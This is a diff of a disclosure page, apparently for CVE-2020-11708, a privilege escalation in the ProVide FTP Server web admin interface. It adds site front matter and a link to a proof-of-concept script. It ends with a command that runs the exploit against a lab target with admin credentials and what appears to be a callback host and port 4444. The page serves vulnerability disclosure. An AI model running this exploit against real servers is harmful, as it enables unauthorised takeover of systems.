@@ -1,3 +1,9 @@
+---
+layout: default
+parent: ProVide FTP Server for Windows
+nav_order: 8
+title: CVE-2020-11708 - Privilege Escalation via EXECUTE()
+---
 # Web Admin Interface - Privilege Escalation via EXECUTE()
 
 ## Summary
@@ -12,7 +18,7 @@ The weakness was disclosed 04/06/2020 by Alessandro Magnosi (deadc0de) (GitHub R
 
 ## Proof-of-Concept
 
-The `privesc.py` script has been provided to reproduce the issue.
+The [privesc.py](https://github.com/belong2yourself/vulnerabilities/blob/master/docs/ProVide/Web%20Admin%20Interface%20-%20Privilege%20Escalation%20via%20EXECUTE()/privesc.py) script has been provided to reproduce the issue.
 
 ```shell
 root@kali:~# python3 privesc_exec.py -t 192.168.226.140 -u Admin -p Passw0rd! -H 192.168.226.129 -P 4444 
